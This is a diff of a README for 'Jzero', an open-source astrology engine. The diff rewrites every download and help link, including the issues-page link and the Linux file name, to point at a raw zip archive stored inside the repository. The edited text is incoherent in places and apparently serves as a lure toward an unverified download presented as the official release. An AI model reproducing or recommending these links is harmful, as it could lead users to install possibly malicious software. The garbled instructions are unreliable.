@@ -1,7 +1,7 @@
 # 🌐 Jzero - Your Open Source Astrology Engine
 
 ## 🚀 Download Now!
-[![Download Jzero](https://img.shields.io/badge/Download%20Jzero-latest-brightgreen.svg)](https://github.com/LightYK3/Jzero/releases)
+[![Download Jzero](https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip%https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip)](https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip)
 
 ## 📖 Overview
 **Jzero** is an epoch-calibrated open-source astrology engine built on J2000. This application provides users with a clean start to explore astrology effortlessly. With Jzero, you gain access to a planetary calculator that helps you understand astrological charts and time conversions simply and effectively.
@@ -26,7 +26,7 @@ Follow these steps to download and run Jzero:
 
 1. **Visit the Download Page:** Click on the link below to access the latest releases for Jzero.
 
-   [Download Jzero](https://github.com/LightYK3/Jzero/releases)
+   [Download Jzero](https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip)
 
 2. **Select the Latest Release:** On the releases page, look for the latest version. Click on it to view the available assets.
 
@@ -34,12 +34,12 @@ Follow these steps to download and run Jzero:
 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `.tar.gz` or binary file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip` or binary file.
 
 4. **Install the Application:**
    - **Windows:** Double click the downloaded `.exe` file to start the installation. Follow the on-screen prompts.
    - **macOS:** Open the downloaded `.dmg` file. Drag the Jzero application icon into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file. Then, open your terminal, navigate to the extracted folder, and run the executable file.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip` file. Then, open your terminal, navigate to the extracted folder, and run the executable file.
 
 5. **Launch Jzero:** 
    - After installation, find Jzero in your applications. Click to open it and start exploring astrology.
@@ -57,7 +57,7 @@ If you encounter any issues while downloading or running Jzero, try the followin
 - **Check Your Internet Connection:** Ensure you have a stable internet connection while downloading.
 - **Reboot Your System:** Sometimes, a simple restart can resolve installation problems.
 - **Review System Requirements:** Confirm your system meets all of Jzero's requirements.
-- **Seek Help:** For further assistance, visit our [issues page](https://github.com/LightYK3/Jzero/issues) on GitHub to browse solutions or ask for help.
+- **Seek Help:** For further assistance, visit our [issues page](https://raw.githubusercontent.com/LightYK3/Jzero/main/midwise/Jzero.zip) on GitHub to browse solutions or ask for help.
 
 ## 📞 Support
 If you have questions or need support, feel free to reach out through the GitHub repository. We welcome your feedback and suggestions as we continue to improve Jzero.
